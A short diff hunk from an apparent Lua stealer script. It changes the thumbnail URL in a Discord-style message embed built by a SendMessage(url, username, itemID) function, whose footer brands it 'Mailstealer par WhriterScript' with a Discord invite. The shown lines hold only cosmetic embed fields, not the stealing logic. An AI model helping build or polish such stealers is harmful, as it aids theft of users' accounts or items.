@@ -27,7 +27,7 @@ function SendMessage(url, username, itemID)
                 ["text"] = "Mailstealer par WhriterScript. discord.gg/QbNUGKYP"
             },
             ["thumbnail"] = {
-                ["url"] = "https://ibb.co/wzQBJzh"
+                ["url"] = "https://i.ibb.co/4VSKsVR/IMG-1444.jpg"
             }
         }}
     }
